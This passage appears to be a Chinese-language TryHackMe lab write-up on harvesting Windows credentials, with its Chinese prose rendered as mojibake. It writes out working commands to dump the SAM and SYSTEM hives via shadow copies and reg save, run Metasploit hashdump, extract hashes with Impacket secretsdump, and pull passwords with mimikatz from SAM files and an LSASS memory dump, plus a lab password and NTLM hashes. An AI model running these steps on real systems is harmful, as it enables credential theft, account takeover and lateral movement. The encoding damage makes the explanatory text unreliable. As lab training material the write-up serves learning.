REG_SZ /s | findstr THM ä¸Šè¿°å‘½ä»¤æˆåŠŸæ‰¾åˆ°flagæ‰€åœ¨æ³¨å†Œè¡¨çš„ä½ç½® æšä¸¾ç›®æ ‡ADç¯å¢ƒï¼Œæ‰¾åˆ°victim(å—å®³è€…)ç”¨æˆ·åœ¨å…¶æè¿°éƒ¨åˆ†æ‰€ä¿å­˜çš„å¯†ç å€¼ï¼š PS C:\\Users\\thm&gt; Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description #Get-ADUser -Filter {Description -like \"*password*\"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description #Import-Module ActiveDirectory #Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description 0x04 æœ¬åœ°Windowså‡­æ® ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒWindowsæ“ä½œç³»ç»Ÿä¼šæä¾›ä¸¤ç§ç±»å‹çš„ç”¨æˆ·å¸æˆ·ï¼šæœ¬åœ°å’ŒåŸŸã€‚æœ¬åœ°ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ä¼šå­˜å‚¨åœ¨æœ¬åœ°Windowsæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè€ŒåŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯åˆ™ä¼šå­˜å‚¨åœ¨é›†ä¸­å¼çš„Active Directoryä¸­ã€‚æœ¬å°èŠ‚ä¸»è¦è®¨è®ºæœ¬åœ°ç”¨æˆ·å¸æˆ·çš„å‡­æ®ï¼Œå¹¶ä»‹ç»æˆ‘ä»¬åº”è¯¥å¦‚ä½•è·å–è¿™äº›æœ¬åœ°Windowså‡­æ®ã€‚ é”®ç›˜è®°å½•å™¨ é”®ç›˜è®°å½•å™¨æ˜¯ä¸€ç§ç›‘è§†å’Œè®°å½•è®¡ç®—æœºé”®ç›˜è¾“å…¥æ´»åŠ¨çš„è½¯ä»¶æˆ–ç¡¬ä»¶è®¾å¤‡ã€‚é”®ç›˜è®°å½•å™¨æœ€åˆæ˜¯ä¸ºåˆæ³•ç›®çš„è€Œè®¾è®¡çš„ï¼Œä¾‹å¦‚ä¸ºè½¯ä»¶å¼€å‘æˆ–å®¶é•¿æ§åˆ¶æä¾›åé¦ˆï¼›ç„¶è€Œï¼Œå®ƒä»¬ä¹Ÿå¯èƒ½ä¼šè¢«æ”»å‡»è€…æ»¥ç”¨ä»¥çªƒå–æ•°æ®ã€‚ä½œä¸ºçº¢é˜Ÿé˜Ÿå‘˜ï¼Œé’ˆå¯¹ç¹å¿™çš„äº¤äº’å¼ç¯å¢ƒé€šè¿‡é”®ç›˜è®°å½•ç¨‹åºæ¥æŸ¥æ‰¾ç›®æ ‡ç”¨æˆ·çš„å‡­æ®æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚å¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªè¢«å…¥ä¾µçš„ç›®æ ‡æœºå™¨æœ‰ä¸€ä¸ªæ›¾ç»ç™»å½•è¿‡çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Metasploitæ¡†æ¶æˆ–è€…å…¶ä»–å·¥å…·(å……å½“é”®ç›˜è®°å½•å™¨)æ¥å°è¯•æ•è·ç”¨æˆ·çš„é”®ç›˜è®°å½•ï¼Œå¹¶å°è¯•ä»è¿™äº›è®°å½•ä¸­å‘ç°æœ‰æ•ˆå‡­æ®ã€‚ å…³äºé”®ç›˜è®°å½•å™¨çš„ç®€å•æ¼”ç¤ºï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Exploiting Active Directory(åˆ©ç”¨ADåŸŸé”™è¯¯é…ç½®)-çº¢é˜Ÿ å®‰å…¨å¸æˆ·ç®¡ç†å™¨(SAM-Security Account Manager) SAMæ˜¯Microsoft Windowsçš„ä¸€ä¸ªç³»ç»Ÿå†…ç½®æ•°æ®åº“ï¼Œå…¶ä¸­åŒ…å«äº†å½“å‰æœºå™¨çš„æœ¬åœ°å¸æˆ·ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åå’Œå¯†ç ç­‰ï¼ŒSAMæ•°æ®åº“ä¼šä»¥åŠ å¯†æ ¼å¼å­˜å‚¨è¿™äº›å¸æˆ·è¯¦ç»†ä¿¡æ¯ï¼Œä½¿å®ƒä»¬æ›´åŠ éš¾ä»¥è¢«æ£€ç´¢ï¼›æ­¤å¤–ï¼Œåœ¨Windowsæ“ä½œç³»ç»Ÿè¿è¡ŒæœŸé—´ï¼ŒSAMæ•°æ®åº“æ–‡ä»¶ä¸èƒ½è¢«ä»»ä½•ç”¨æˆ·ç›´æ¥è¯»å–å’Œè®¿é—®ã€‚ tipsï¼šä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬æœ‰å¤šç§æ–¹æ³•å’Œæ”»å‡»æŠ€å·§å¯ä»¥è½¬å‚¨Windowsæœºå™¨çš„SAMæ•°æ®åº“æ–‡ä»¶çš„å†…å®¹ã€‚ åœ¨æœ¬æ–‡æˆ‘ä»¬å·²ç»éƒ¨ç½²çš„ç›®æ ‡æœºå™¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤çš„æ˜¯ï¼šæˆ‘ä»¬æ— æ³•ç›´æ¥å¤åˆ¶æˆ–è€…è¯»å–C:\\Windows\\System32\\config\\samæ–‡ä»¶ã€‚ #åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œé€šè¿‡ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥ç¡®è®¤æˆ‘ä»¬æ— æ³•è®¿é—®SAMæ•°æ®åº“ C:\\Windows\\system32&gt; type c:\\Windows\\System32\\config\\sam type c:\\Windows\\System32\\config\\sam The process cannot access the file because it is being used by another process. C:\\Windows\\System32&gt; copy c:\\Windows\\System32\\config\\sam C:\\Users\\Administrator\\Desktop\\ copy c:\\Windows\\System32\\config\\sam C:\\Users\\Administrator\\Desktop\\ The process cannot access the file because it is being used by another process. 0 file(s) copied. ä½¿ç”¨HashDumpè·å–SAMæ–‡ä»¶ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Metasploit Frameworkå†…ç½®çš„hashdumpåŠŸèƒ½æ¥è·å–SAMæ•°æ®åº“æ–‡ä»¶çš„å†…å®¹å‰¯æœ¬ã€‚Metasploitæ¡†æ¶ä¼šå°†ä»£ç æ³¨å…¥åˆ°Windowsæœºå™¨çš„LSASS.exeè¿›ç¨‹ä¸­ï¼Œä»è€Œè½¬å‚¨ä¸è¯¥è¿›ç¨‹å¯¹åº”çš„å†…å­˜ä¸­çš„å“ˆå¸Œå€¼å‰¯æœ¬ã€‚æœ‰å…³hashdumpçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è‡ªè¡Œè®¿é—®MSFå‘å¸ƒæ–¹rapid7çš„å®˜æ–¹åšå®¢ã€‚ #æˆ‘ä»¬è¦åœ¨ä½¿ç”¨MSFé’ˆå¯¹ç›®æ ‡æœºå™¨è·å¾—äº†meterpreter shellä¼šè¯ä¹‹åï¼Œæ‰èƒ½ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡ŒHashDumpã€‚ meterpreter &gt; getuid Server username: THM\\Administrator meterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d::: é€šè¿‡å·å½±å¤åˆ¶æœåŠ¡è·å–SAMæ–‡ä»¶ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Microsoftå·å½±å¤åˆ¶æœåŠ¡æ¥è·å–SAMæ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ªæœåŠ¡æœ‰åŠ©äºåœ¨åº”ç”¨ç¨‹åºå¯¹å·è¿›è¡Œè¯»å†™æ—¶æ‰§è¡Œå·å¤‡ä»½æ“ä½œã€‚æœ‰å…³å·å½±å¤åˆ¶æœåŠ¡çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è‡ªè¡Œå‚è€ƒMicrosoftçš„ç›¸å…³æ–‡æ¡£é¡µé¢ã€‚ å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨wmicåˆ›å»ºä¸€ä¸ªå·å½±å‰¯æœ¬ï¼Œè¿™éœ€è¦æˆ‘ä»¬ä»¥ç®¡ç†å‘˜æƒé™ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦(CMD)ç•Œé¢æ¥å®Œæˆï¼Œç›¸å…³æ­¥éª¤å¦‚ä¸‹æ‰€ç¤ºï¼š ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œæ ‡å‡†çš„cmd.exeç¨‹åºã€‚ æ‰§è¡Œwmicå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªå…³äºC: driveçš„å·å½±å‰¯æœ¬ã€‚ éªŒè¯æ­¥éª¤2ä¸­æ‰€åˆ›å»ºçš„å·å½±å‰¯æœ¬æ˜¯å¦å¯ç”¨ã€‚ ä»æˆ‘ä»¬åœ¨æ­¥éª¤2ä¸­æ‰€åˆ›å»ºçš„å·å½±å‰¯æœ¬ä¸­å¤åˆ¶å‡ºSAMæ•°æ®åº“æ–‡ä»¶ã€‚ ç°åœ¨è®©æˆ‘ä»¬å®è·µä¸€ä¸‹ä¸Šé¢æ‰€ä»‹ç»çš„å†…å®¹ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œcmd.exeï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹wmicå‘½ä»¤ï¼š #ä½¿ç”¨WMICå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªå…³äºç³»ç»ŸCå·çš„å½±å­å‰¯æœ¬ C:\\Users\\Administrator&gt; wmic shadowcopy call create Volume='C:\\' Executing (Win32_ShadowCopy)-&gt;create() Method execution successful. Out Parameters: instance of __PARAMETERS { ReturnValue = 0; ShadowID = \"{30821F09-02EF-49E6-A858-2F6CEDBBF11B}\"; }; tipsï¼šWindows Management Instrumentation-WMIï¼Œwmicå«ä¹‰ä¸ºWMI(Windowsç®¡ç†å·¥å…·)å‘½ä»¤è¡Œï¼Œå¯¹åº”çš„åº”ç”¨ç¨‹åºä¸ºwmic.exeã€‚ ä¸Šè¿°å‘½ä»¤æˆåŠŸæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨vssadmin(å·å½±å¤åˆ¶æœåŠ¡ç®¡ç†-Volume Shadow Copy Service administrative)å‘½ä»¤è¡Œå·¥å…·æ¥åˆ—å‡ºå¹¶ç¡®è®¤æˆ‘ä»¬å·²ç»åˆ›å»ºäº†å…³äºç³»ç»ŸC:å·çš„å½±å­å‰¯æœ¬ï¼š #åˆ—å‡ºå¯ç”¨çš„å·å½±å‰¯æœ¬ C:\\Windows\\system32&gt;vssadmin list shadows vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Contents of shadow copy set ID: {2b04f365-d3f6-48c2-a610-00b32854483b} Contained 1 shadow copies at creation time: 3/4/2024 9:25:06 AM Shadow Copy ID: {b5a918e3-32a9-4282-97b3-55ae6aaa143b} Original Volume: (C:)\\\\?\\Volume{19127295-0000-0000-0000-100000000000}\\ Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 Originating Machine: Creds-Harvesting-AD.thm.red Service Machine: Creds-Harvesting-AD.thm.red Provider: 'Microsoft Software Shadow Copy provider 1.0' Type: ClientAccessible Attributes: Persistent, Client-accessible, No auto release, No writers, Differential ä¸Šé¢çš„è¾“å‡ºç»“æœæ˜¾ç¤ºæˆ‘ä»¬å·²ç»æˆåŠŸåœ°åˆ›å»ºäº†ä¸€ä¸ªå…³äºC:çš„å·å½±å‰¯æœ¬ï¼Œå…¶è·¯å¾„å¦‚ä¸‹ï¼š\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 å¦‚å‰æ‰€è¿°ï¼ŒSAMæ•°æ®åº“ä¼šä½¿ç”¨RC4æˆ–AESåŠ å¯†ç®—æ³•æ¥è¿›è¡ŒåŠ å¯†ã€‚ä¸ºäº†è§£å¯†SAMæ•°æ®åº“æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè§£å¯†å¯†é’¥ï¼Œè¯¥å¯†é’¥é€šå¸¸ä¼šå­˜å‚¨åœ¨è®¡ç®—æœºçš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š c:\\Windows\\System32\\Config\\system ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†sam(SAMæ•°æ®åº“æ–‡ä»¶)å’Œsystem(å­˜å‚¨äº†è§£å¯†å¯†é’¥çš„æ–‡ä»¶)ä»æˆ‘ä»¬æ‰€ç”Ÿæˆçš„å·å½±å‰¯æœ¬ä¸­å¤åˆ¶åˆ°è®¡ç®—æœºæ¡Œé¢ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š C:\\Users\\Administrator&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\Administrator\\Desktop\\sam 1 file(s) copied. C:\\Users\\Administrator&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\Administrator\\Desktop\\system 1 file(s) copied. å¾—åˆ°ä¸Šè¿°ä¸¤ä¸ªæ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å®ƒä»¬ä¼ è¾“åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºä¸­(ä¾‹å¦‚ä½¿ç”¨SCPå‘½ä»¤æ¥è¿›è¡Œå¤åˆ¶)ã€‚ é€šè¿‡æ³¨å†Œè¡¨é…ç½®å•å…ƒè·å–SAMæ–‡ä»¶ è½¬å‚¨SAMæ•°æ®åº“å†…å®¹çš„å¦ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡Windows Registry Hives(Windowsæ³¨å†Œè¡¨é…ç½®å•å…ƒ)ã€‚Windowsæ³¨å†Œè¡¨ä¼šå­˜å‚¨ä¸€äº›ä¾›WindowsæœåŠ¡ä½¿ç”¨çš„SAMæ•°æ®åº“å†…å®¹çš„å‰¯æœ¬ï¼Œè€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨reg.exeæ¥ä¿å­˜Windowsæ³¨å†Œè¡¨çš„å€¼ã€‚å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦åŸºäºä¸¤ä¸ªæ–‡ä»¶æ¥è·å–å¹¶è§£å¯†SAMæ•°æ®åº“æ–‡ä»¶çš„å†…å®¹ã€‚ æˆ‘ä»¬éœ€è¦ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œcmd.exeå¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š #ä»æœ¬åœ°æ³¨å†Œè¡¨ä¸­ä¿å­˜SAMæ–‡ä»¶å’Œsystemæ–‡ä»¶ C:\\Users\\Administrator\\Desktop&gt;reg save HKLM\\sam C:\\users\\Administrator\\Desktop\\sam-reg The operation completed successfully. C:\\Users\\Administrator\\Desktop&gt;reg save HKLM\\system C:\\users\\Administrator\\Desktop\\system-reg The operation completed successfully. æˆ‘ä»¬å¯ä»¥ç”¨Impacketå·¥å…·åŒ…ä¸­çš„ä¸€ä¸ªå·¥å…·æ¥è§£å¯†SAMæ–‡ä»¶ï¼šsecretsdump.pyï¼ŒImpacket SecretsDumpè„šæœ¬ä¼šä½¿ç”¨ä¸åŒçš„æŠ€æœ¯ä»æœ¬åœ°å’Œè¿œç¨‹ç³»ç»Ÿä¸­æå–å‡­æ®ã€‚ æˆ‘ä»¬å…ˆå°†SAMæ–‡ä»¶å’Œsystemæ–‡ä»¶ä¼ è¾“åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºä¸­ï¼Œç„¶ååœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š #åœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ root@hekeats:~# scp THM\\\\thm@10.10.63.254:C:/Users/Administrator/Desktop/sam-reg /tmp/ root@hekeats:~# scp THM\\\\thm@10.10.63.254:C:/Users/Administrator/Desktop/system-reg /tmp/ #Passwordï¼šPassw0rd! â”Œâ”€â”€(rootã‰¿kali)-[/home/hybcx/thm/impacket] â””â”€# python3 examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information. [*] Cleaning up... åœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬å°†é’ˆå¯¹ä»Windowsæ³¨å†Œè¡¨ä¸­æ‰€æå–çš„SAMæ–‡ä»¶å’ŒSystemæ–‡ä»¶è¿›è¡Œå‡­æ®æå–ã€‚-samå‘½ä»¤å‚æ•°ç”¨äºæŒ‡å®šä»Windowsæœºå™¨ä¸­æ‰€è½¬å‚¨çš„samæ–‡ä»¶åœ¨æ”»å‡»æœºä¸­çš„è·¯å¾„ï¼Œ-systemå‘½ä»¤å‚æ•°åˆ™ç”¨äºæŒ‡å®šsystemæ–‡ä»¶åœ¨æ”»å‡»æœºä¸­çš„è·¯å¾„ï¼Œæ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ä¸Šè¿°å‘½ä»¤çš„æœ«å°¾ä½¿ç”¨LOCALå‘½ä»¤å‚æ•°æ¥æŒ‡å®šæˆ‘ä»¬è¦è§£å¯†çš„æ˜¯LOCAL SAMæ–‡ä»¶ï¼Œå› ä¸ºè¯¥å·¥å…·ä¹Ÿå¯ä»¥ç”¨æ¥å¤„ç†å…¶ä»–ç±»å‹çš„è§£å¯†ã€‚ æ³¨æ„ï¼šå¦‚æœæˆ‘ä»¬å°†ä¸Šè¿°å‘½ä»¤çš„è¾“å‡ºç»“æœä¸ä½¿ç”¨Hashdumpæ‰€è·å¾—çš„NTLMå“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼šæ³¨æ„åˆ°å®ƒä»¬çš„ç»“æœæ˜¯ä¸åŒçš„ã€‚å› ä¸ºSAMæ–‡ä»¶ä¸­çš„æœ‰äº›å¸æˆ·æ˜¯å±äºActive Directoryçš„ï¼Œå®ƒä»¬çš„è§£å¯†å¯†é’¥å¹¶æ²¡æœ‰å­˜å‚¨åœ¨æˆ‘ä»¬ä¸Šé¢æ‰€è½¬å‚¨çš„Systemæ–‡ä»¶ä¸­ï¼›è¦è§£å¯†è¿™äº›ADå¸æˆ·çš„å‡­æ®ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä»Windowsä¸­è½¬å‚¨SECURITYæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¼šåŒ…å«ç”¨äºè§£å¯†Active Directoryå¸æˆ·çš„å¯†é’¥ã€‚ ä¸€æ—¦æˆ‘ä»¬æˆåŠŸè·å¾—äº†ç›®æ ‡å¸æˆ·çš„NTLMå“ˆå¸Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨Hashcatæ¥ç ´è§£å®ƒä»¬ï¼Œæˆ–è€…å¯ä»¥ä½¿ç”¨å“ˆå¸Œä¼ é€’(PtH)ç­‰æŠ€æœ¯æ¥æ¨¡æ‹Ÿè¿™äº›å“ˆå¸Œæ‰€å¯¹åº”çš„ç”¨æˆ·èº«ä»½ã€‚ è¡¥å……ï¼š æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡SAMæ–‡ä»¶+mimikatzæ¥è¯»å–å¯†ç ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š #å…ˆåœ¨ç›®æ ‡æœºå™¨ä¸Šå¯¼å‡ºSAMå’ŒSystemæ–‡ä»¶ C:\\Windows\\system32&gt; reg save HKLM\\SYSTEM sys.hiv C:\\Windows\\system32&gt; reg save HKLM\\SAM sam.hiv #å°†ä¸Šè¿°è·å¾—çš„sys.hivå’Œsam.hivæ–‡ä»¶å¤åˆ¶åˆ°mimikatzæ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œè¿è¡Œmimikatzï¼Œè¾“å…¥lsadump::sam /system:sys.hiv /sam:sam.hivï¼Œå³å¯å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·å¯†ç hash å¯å‚è€ƒåšå®¢ï¼šåœ¨windowsä¸­æŠ“å–ç”¨æˆ·å¯†ç  #æˆ‘ä»¬åœ¨ç›®æ ‡æœºä¸Šä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒMimikatzå·¥å…·(ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨ç›®æ ‡æœºä¸Šè¿è¡Œcmdï¼Œç„¶åå†åŠ è½½Mimikatzå³å¯) C:\\Windows\\system32&gt; C:\\Tools\\Mimikatz\\mimikatz.exe mimikatz# privilege::debug mimikatz# token::elevate mimikatz# lsadump::sam æ³¨æ„ï¼šæ­¤å¤„æˆ‘ä»¬æ‰€è·å¾—çš„Administratorå¹¶ä¸æ˜¯ADä¸­çš„SID 500æ‰€å¯¹åº”çš„Administratorå¸æˆ·ï¼Œè€Œæ˜¯DSRM(ç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼)å¸æˆ·ï¼Œæ­¤å¸æˆ·å¯ç”¨äºå¯åŠ¨DCã€ç™»å½•å’Œå°è¯•æ¢å¤ADï¼ŒWindowsç½‘ç»œåœ¨å°†Windows Serverå‡çº§ä¸ºDC(åŸŸæ§åˆ¶å™¨)çš„è¿‡ç¨‹ä¸­ä¼šæç¤ºæˆ‘ä»¬è®¾ç½®æ­¤å¯†ç ã€‚(ç›¸å…³éªŒè¯è¿‡ç¨‹è¯·å‚è€ƒè¿”ç’å½’çœŸï¼šNTDS.dit vs SAM) 0x05 LSASS(æœ¬åœ°å®‰å…¨è®¤è¯å­ç³»ç»ŸæœåŠ¡) ä»€ä¹ˆæ˜¯LSASSï¼Ÿ æœ¬åœ°å®‰å…¨è®¤è¯å­ç³»ç»ŸæœåŠ¡(LSASS)æ˜¯ç”¨äºå¤„ç†æ“ä½œç³»ç»Ÿå®‰å…¨ç­–ç•¥å¹¶èƒ½åœ¨ç³»ç»Ÿä¸Šè¢«å¼ºåˆ¶æ‰§è¡Œçš„Windowsè¿›ç¨‹ï¼Œå®ƒä¼šéªŒè¯å½“å‰è®¡ç®—æœºä¸Šæ‰€ç™»å½•çš„ç”¨æˆ·å¸æˆ·ï¼Œå¹¶ç¡®ä¿è¯¥ç”¨æˆ·æ‰€æä¾›çš„å¯†ç ã€æ•£åˆ—å’ŒKerberosç¥¨æ®æ­£ç¡®ã€‚Windowsç³»ç»Ÿä¼šå°†å‡­æ®å­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä½¿ç”¨æˆ·å¯ä»¥æ›´æ–¹ä¾¿åœ°è®¿é—®æ–‡ä»¶å…±äº«ã€SharePointç«™ç‚¹ç­‰ç½‘ç»œèµ„æºï¼Œè€Œæ— éœ€åœ¨æ¯æ¬¡è¿æ¥æ—¶éƒ½è¦æ±‚ç”¨æˆ·è¾“å…¥å‡­æ®ã€‚ LSASSè¿›ç¨‹å¯¹äºçº¢é˜Ÿæ¥è¯´æ˜¯ä¸€ä¸ªè¯±äººçš„æ”»å‡»ç›®æ ‡ï¼Œå› ä¸ºè¯¥è¿›ç¨‹çš„å†…å­˜ä¸­ä¼šå­˜å‚¨å…³äºç”¨æˆ·å¸æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€‚LSASSè¿›ç¨‹é€šå¸¸å¯è¢«æ”»å‡»è€…ç”¨äºè½¬å‚¨ç”¨æˆ·å‡­æ®ï¼Œä»è€Œè¿›è¡Œæƒé™æå‡ã€çªƒå–æ•æ„Ÿæ•°æ®æˆ–è€…è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ç›®æ ‡æœºå™¨çš„ç®¡ç†å‘˜æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•è½¬å‚¨ç›®æ ‡æœºå™¨çš„LSASSè¿›ç¨‹çš„å†…å­˜ï¼ŒWindowsç³»ç»Ÿä¼šå…è®¸æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªè½¬å‚¨æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯ç»™å®šè¿›ç¨‹çš„å¿«ç…§ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®ç›¸å…³çš„GUIæˆ–è€…ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢(CMD)æ¥å®ŒæˆLSASSè¿›ç¨‹å†…å­˜çš„è½¬å‚¨æ“ä½œï¼Œè¿™ç§æ”»å‡»åœ¨MITRE ATT&amp;CKæ¡†æ¶ä¸­å®šä¹‰ä¸ºâ€œæ“ä½œç³»ç»Ÿå‡­æ®è½¬å‚¨:LSASSå†…å­˜(T1003)â€ã€‚ ä½¿ç”¨å›¾å½¢ç”¨æˆ·ç•Œé¢(GUI) å¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨è®¡ç®—æœºçš„GUIæ¥è½¬å‚¨ä»»ä½•æ­£åœ¨è¿è¡Œçš„Windowsè¿›ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å…ˆæ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œç„¶ååœ¨è¯¦ç»†ä¿¡æ¯é€‰é¡¹å¡ä¸­æ‰¾åˆ°æ‰€éœ€çš„è¿›ç¨‹ï¼Œå³é”®å•å‡»å®ƒå¹¶é€‰æ‹©â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€ã€‚ æ³¨ï¼šè¿™é‡Œæˆ‘ç‚¹å‡»å‘ç°æ²¡æœ‰æƒé™ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½ä¹Ÿä¸è¡Œ åœ¨ä¸Šè¿°è½¬å‚¨è¿‡ç¨‹å®Œæˆä¹‹åï¼Œç›®æ ‡æœºå™¨å°†æ˜¾ç¤ºä¸€ä¸ªå¼¹å‡ºæ¶ˆæ¯ï¼Œå…¶ä¸­ä¼šåŒ…å«å·²ç»è½¬å‚¨çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¹¶å¤åˆ¶è¯¥æ–‡ä»¶ç„¶åå°†å®ƒä¼ è¾“åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºä»¥ç¦»çº¿æå–å…¶ä¸­çš„NTLMå“ˆå¸Œå€¼ã€‚ æ³¨æ„ï¼šå¦‚æœç›®æ ‡æœºå™¨çš„LSASSè¿›ç¨‹æ˜¯å—ä¿æŠ¤çŠ¶æ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è¿è¡Œä¸Šè¿°è½¬å‚¨æ“ä½œæ—¶ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯æç¤ºï¼Œé™¤éæˆ‘ä»¬æˆåŠŸä¿®æ”¹ä¸LSASSè¿›ç¨‹ç›¸å…³çš„æ³¨å†Œè¡¨å€¼ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸Šè¿°æ‰€è½¬å‚¨çš„è¿›ç¨‹ç›¸å…³æ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡æœºå™¨çš„Mimikatzæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åå†ä½¿ç”¨Mimikatzæ¥å¤„ç†LSASSè¿›ç¨‹çš„å†…å­˜è½¬å‚¨ã€‚ C:\\Users\\Administrator&gt;copy C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\lsass.DMP C:\\Tools\\Mimikatz\\lsass.DMP 1 file(s) copied. #ç„¶åå†ä½¿ç”¨MimiKatzæ¥è¯»å–å¯†ç ä¿¡æ¯ #æ³¨æ„ï¼šè¦ä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œcmd C:\\Tools\\Mimikatz&gt; mimikatz.exe mimikatz # privilege::debug mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonpasswords ä½¿ç”¨ç³»ç»Ÿå†…éƒ¨å¥—ä»¶ 